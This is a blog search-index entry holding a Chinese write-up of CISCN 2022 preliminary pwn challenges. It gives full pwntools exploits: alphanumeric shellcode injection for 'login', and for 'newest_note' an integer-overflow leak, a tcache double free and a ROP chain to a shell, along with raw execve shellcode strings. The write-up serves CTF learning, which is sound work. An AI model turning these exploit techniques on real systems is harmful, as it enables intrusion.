<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022 ciscn 初赛</title>
    <link href="/2022/07/01/CTF_competition/2022ciscn/"/>
    <url>/2022/07/01/CTF_competition/2022ciscn/</url>
    
    <content type="html"><![CDATA[<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用<code>rdx</code>进行触发。</p><blockquote><p> 参考文章：<a href="https://blog.csdn.net/SmalOSnail/article/details/105236336">(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode</a></p></blockquote><p>使用alpha3的基本步骤：</p><ol><li><p>python运行以下脚本生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode_x64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-comment"># 注意打开的格式是wb</span><br>payload = asm(shellcraft.sh())<span class="hljs-comment"># 可以手写</span><br>f.write(payload)<br>f.close()<br></code></pre></td></tr></table></figure></li><li><p>使用命令生成可见字符的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;<br></code></pre></td></tr></table></figure></li></ol><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment"># 使用ae64生成的shellcode</span><br><br>payload = <span class="hljs-string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span><br>sh.send(payload)<br>sh.recv()<br>payload = <span class="hljs-string">&#x27;msg:&#x27;</span> + shellcode + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;opt:2\n\n&#x27;</span><br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><p>通过整型溢出使得分配的堆块大小大于<code>0x21000</code>，此堆块的指针就与libc存在固定的偏移，由此我们可以通过show这一个功能来泄露libc的地址，同时也可以通过内指针和environ来泄露栈地址，最后进行rop。</p><blockquote><p>比赛中没能想到这一点，属是有点弱鸡≧ ﹏ ≦</p></blockquote><p><code>malloc(8*0x20005000)</code>，将会得到一个位于.tls段上的指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx <span class="hljs-variable">$rebase</span>(0x4190)</span><br>0x557505d22190: 0x00007fb40f836010      0x0000000020005000<br></code></pre></td></tr></table></figure><p>一个小tips：可以通过pwndbg中的search命令来寻找内指针：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search</span><br>usage: search [-h] [-t &#123;byte,short,word,dword,qword,pointer,string,bytes&#125;] [-1] [-2] [-4] [-8] [-p] [-x] [-s] [-e]<br>              [-w] [--save] [--no-save] [-n]<br>              value [mapping_name]<br>search: error: the following arguments are required: value<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;environ</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;data variable, no debug info&gt; *) 0x7fb40fa82ec0 &lt;environ&gt;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search -p 0x7fb40fa82ec0</span><br>libc.so.6       0x7fb40fa79fb8 0x7fb40fa82ec0<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx 0x7fb40fa82ec0</span><br>0x7fb40fa82ec0 &lt;environ&gt;:       0x00007ffd346f8448      0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过double_free修改main函数的返回地址，最后退出程序即可get_shell。需要注意进行fake_chunk分配的时候，目标地址的环境是否能满足分配条件。</p><p>WP如下：</p><blockquote><p>e4l4师傅的模板还是挺香的(●’◡’●)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./newest_note&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./newest_note&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------#</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, data = <span class="hljs-string">&#x27;pursue&#x27;</span></span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>sla(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20005000</span>)) <span class="hljs-comment"># str()会将十六进制转化为十进制的字符串</span><br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0x4899a</span>)<br>libc_base = uu64() - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br><br><span class="hljs-comment"># leak stack</span><br>show(<span class="hljs-number">0x487f5</span>)<br>stack_addr = uu64()<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i)  <span class="hljs-comment"># 0-9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)  <span class="hljs-comment"># 0-6</span><br><br><span class="hljs-comment"># leak heap</span><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)     <span class="hljs-comment"># double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i)<br><span class="hljs-comment"># dbg()</span><br>pld = p64((stack_addr - <span class="hljs-number">0x138</span>) ^ key)<br>add(<span class="hljs-number">0</span>, pld)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>pld = p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>add(<span class="hljs-number">3</span>, pld)     <span class="hljs-comment"># change main_ret_address</span><br><br>sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)     <span class="hljs-comment"># exit</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h2><blockquote><p>找了三篇文章，之后可能会进行具体的学习：</p><p><a href="https://lakwsh.net/?p=457">CISCN 2022 初赛 satool writeup – 数字的秘密基地 (lakwsh.net)</a></p><p>[<a href="https://bbs.pediy.com/thread-273119.htm">原创]LLVM PASS类pwn题入门-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a href="https://blog.csdn.net/Vin_tt/article/details/118405231">(8条消息) Linux环境下LLVM + clang安装_dididadidaa的博客-CSDN博客_linux llvm</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
